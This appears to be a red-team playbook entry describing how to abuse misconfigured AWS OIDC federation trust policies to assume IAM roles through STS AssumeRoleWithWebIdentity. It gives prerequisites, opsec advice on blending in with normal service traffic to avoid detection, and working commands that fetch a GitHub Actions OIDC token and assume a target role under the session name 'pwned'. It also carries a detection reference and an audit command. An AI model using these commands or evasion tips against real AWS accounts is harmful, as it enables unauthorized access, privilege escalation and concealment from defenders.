oidc_sts_attack.description: OIDC (OpenID Connect) federation with STS AssumeRoleWithWebIdentity allows external identity providers to assume AWS IAM roles. If the trust policy is misconfigured (e.g., using ':sub' wildcard or overly permissive conditions), an attacker with a valid JWT from the trusted OIDC provider can assume the role and escalate privileges.
oidc_sts_attack.opsec: AssumeRoleWithWebIdentity calls appear in CloudTrail under eventName=AssumeRoleWithWebIdentity. Anomalous if source IP is unexpected. Use short-lived session tokens and blend with normal service traffic.
oidc_sts_attack.prerequisites: Access to a trusted OIDC provider (GitHub Actions, Kubernetes service account, Google Workload Identity). Knowledge of the target IAM role ARN and trust policy conditions. Valid JWT from the trusted IdP.

oidc_sts_assume_role.opsec: OIDC token exchange appears as legitimate AssumeRoleWithWebIdentity in CloudTrail. Attacker source IP will differ from expected CI/CD origin.
oidc_sts_assume_role.detection_ref: CloudTrail: AssumeRoleWithWebIdentity events from unexpected source IPs or repositories; audit OIDC trust policies for missing sub/aud conditions

commands.description: Assume role via OIDC token from CI/CD pipeline
commands.command:
# GitHub Actions OIDC (in workflow context)
OIDC_TOKEN=$(curl -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)

# Assume the vulnerable role
aws sts assume-role-with-web-identity \
  --role-arn 'arn:aws:iam::ACCOUNT_ID:role/GitHubActionsRole' \
  --role-session-name pwned \
  --web-identity-token "$OIDC_TOKEN" \
  --query 'Credentials'

# Audit: check all roles with OIDC trust (no sub condition = wide-open)
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Federated]].[RoleName,Arn]'
